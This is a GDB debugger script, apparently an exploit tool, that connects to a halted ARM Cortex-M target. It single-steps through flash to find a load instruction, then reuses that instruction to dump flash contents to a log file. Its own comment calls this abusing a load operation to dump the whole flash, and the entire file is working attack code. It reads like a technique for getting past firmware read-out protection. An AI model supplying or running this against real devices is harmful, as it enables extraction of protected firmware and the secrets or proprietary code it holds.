# Connect to GDB server
target remote localhost:3333
# Reset target device
monitor reset halt

shell rm .tmp_fw_dump

set pagination off
set height 0
set logging file .tmp_fw_dump
set logging enabled on

# Scan range in flash (Thumb instructions)
# First instruction after vector table
set $start = 0x80        
# last flash address
set $end   = 0x100     

# Thumb halfword alignment
set $step  = 2            

# Known CPUID
set $addr     = 0xE000ED00
set $expected = 0x410CC200

# While loop to detect a load operation
set $i = $start
while $i <= $end
    set $r0=$r1=$r2=$r3=$r4=$r5=$r6=$r7=$r8=$r9=$r10=$r11=$r12=$addr

    set $pc = $i
    stepi

    # Check each register individually
    if ($r0 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r0\n", $i
        set $reg = 0
        set $i = $end + 1
    end
    if ($r1 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r1\n", $i
        set $reg = 1
        set $i = $end + 1
    end
    if ($r2 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r2\n", $i
        set $reg = 2
        set $i = $end + 1
    end
    if ($r3 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r3\n", $i
        set $reg = 3
        set $i = $end + 1
    end
    if ($r4 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r4\n", $i
        set $reg = 4
        set $i = $end + 1
    end
    if ($r5 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r5\n", $i
        set $reg = 5
        set $i = $end + 1
    end
    if ($r6 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r6\n", $i
        set $reg = 6
        set $i = $end + 1
    end
    if ($r7 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r7\n", $i
        set $reg = 7
        set $i = $end + 1
    end
    if ($r8 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r8\n", $i
        set $reg = 8
        set $i = $end + 1
    end
    if ($r9 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r9\n", $i
        set $reg = 9
        set $i = $end + 1
    end
    if ($r10 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r10\n", $i
        set $reg = 10
        set $i = $end + 1
    end
    if ($r11 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r11\n", $i
        set $reg = 11
        set $i = $end + 1
    end
    if ($r12 == $expected)
        printf "[LOAD FOUND] PC=0x%08x -> r12\n", $i
        set $reg = 12
        set $i = $end + 1
    end

    # Next instruction
    set $i = $i + $step
end


# While loop to abuse a load operation
# to dump the whole flash memory
set $i = 0
while $i <= $end
  set $pc = $pc - $step
  
  set $r0=$r1=$r2=$r3=$r4=$r5=$r6=$r7=$r8=$r9=$r10=$r11=$r12=$i

  stepi

  if ($reg == 0) 
    printf "0x%08x\n", $r0 
  end
  if ($reg == 1) 
    printf "0x%08x\n", $r1 
  end
  if ($reg == 2) 
    printf "0x%08x\n", $r2 
  end
  if ($reg == 3) 
    printf "0x%08x\n", $r3 
  end
  if ($reg == 4) 
    printf "0x%08x\n", $r4 
  end
  if ($reg == 5) 
    printf "0x%08x\n", $r5 
  end
  if ($reg == 6) 
    printf "0x%08x\n", $r6 
  end
  if ($reg == 7) 
    printf "0x%08x\n", $r7 
  end
  if ($reg == 8) 
    printf "0x%08x\n", $r8 
  end
  if ($reg == 9) 
    printf "0x%08x\n", $r9 
    end
  if ($reg == 10) 
    printf "0x%08x\n", $r10 
  end
  if ($reg == 11) 
    printf "0x%08x\n", $r11 
  end
  if ($reg == 12) 
    printf "0x%08x\n", $r12 
  end

  set $i = $i + 4
end
quit